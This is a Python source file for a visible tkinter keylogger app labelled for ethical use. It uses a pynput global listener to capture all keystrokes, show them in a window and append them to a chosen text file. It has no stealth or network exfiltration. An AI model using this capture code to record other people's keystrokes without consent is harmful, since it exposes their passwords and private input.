import tkinter as tk
from tkinter import filedialog
from pynput import keyboard

class KeyLoggerGUI:
    def __init__(self) -> None:
        self.filename = ""
        self.is_logging = False
        self.logged_keys = ""

        # Setup window
        self.root = tk.Tk()
        self.root.title("🛡️ Keylogger - Ethical Use Only")
        self.root.geometry("600x400")
        self.root.configure(bg="#1e1e2f")

        # Fonts
        font_main = ("Segoe UI", 11)
        font_heading = ("Segoe UI", 14, "bold")

        # Title
        self.title_label = tk.Label(self.root, text="Simple Keylogger", font=font_heading, fg="#ffffff", bg="#1e1e2f")
        self.title_label.pack(pady=(10, 5))

        # Status
        self.status_label = tk.Label(self.root, text="🔴 Logging Stopped", fg="red", bg="#1e1e2f", font=font_main)
        self.status_label.pack(pady=5)

        # Text box for keystrokes
        self.textbox = tk.Text(self.root, wrap="word", font=("Consolas", 10), bg="#252537", fg="#ffffff", insertbackground="#ffffff")
        self.textbox.pack(fill="both", expand=True, padx=10, pady=10)

        # Button frame
        btn_frame = tk.Frame(self.root, bg="#1e1e2f")
        btn_frame.pack(pady=10)

        btn_style = {"font": font_main, "bg": "#3b3b58", "fg": "white", "relief": "groove", "bd": 1, "activebackground": "#565676"}

        self.start_button = tk.Button(btn_frame, text="▶ Start Logging", command=self.start_logging, **btn_style, width=15)
        self.start_button.grid(row=0, column=0, padx=5)

        self.stop_button = tk.Button(btn_frame, text="■ Stop Logging", command=self.stop_logging, state="disabled", **btn_style, width=15)
        self.stop_button.grid(row=0, column=1, padx=5)

        self.clear_button = tk.Button(btn_frame, text="🧹 Clear Logs", command=self.clear_logs, **btn_style, width=15)
        self.clear_button.grid(row=0, column=2, padx=5)

        self.save_button = tk.Button(btn_frame, text="💾 Choose File", command=self.choose_file, **btn_style, width=15)
        self.save_button.grid(row=0, column=3, padx=5)

        # Ethical reminder
        tk.Label(self.root, text="⚠ For ethical use only", font=("Segoe UI", 9), bg="#1e1e2f", fg="#999999").pack(side="bottom", pady=5)

    @staticmethod
    def get_char(key):
        try:
            return key.char
        except AttributeError:
            return f"[{key.name}]"

    def on_press(self, key):
        char = self.get_char(key)
        self.logged_keys += char
        self.textbox.insert(tk.END, char)
        self.textbox.see(tk.END)  # Auto-scroll
        if self.filename:
            with open(self.filename, 'a', encoding='utf-8') as logs:
                logs.write(char)

    def start_logging(self):
        if not self.is_logging:
            self.filename = filedialog.asksaveasfilename(defaultextension=".txt",
                                                         filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
            if self.filename:
                self.is_logging = True
                self.status_label.config(text="🟢 Logging Started", fg="lime")
                self.start_button.config(state="disabled")
                self.stop_button.config(state="normal")
                self.listener = keyboard.Listener(on_press=self.on_press)
                self.listener.start()

    def stop_logging(self):
        if self.is_logging:
            self.is_logging = False
            self.status_label.config(text="🔴 Logging Stopped", fg="red")
            self.start_button.config(state="normal")
            self.stop_button.config(state="disabled")
            if self.listener:
                self.listener.stop()

    def clear_logs(self):
        self.logged_keys = ""
        self.textbox.delete(1.0, tk.END)

    def choose_file(self):
        self.filename = filedialog.asksaveasfilename(defaultextension=".txt",
                                                     filetypes=[("Text files", "*.txt"), ("All files", "*.*")])

    def run(self):
        self.root.mainloop()

if __name__ == '__main__':
    logger = KeyLoggerGUI()
    logger.run()
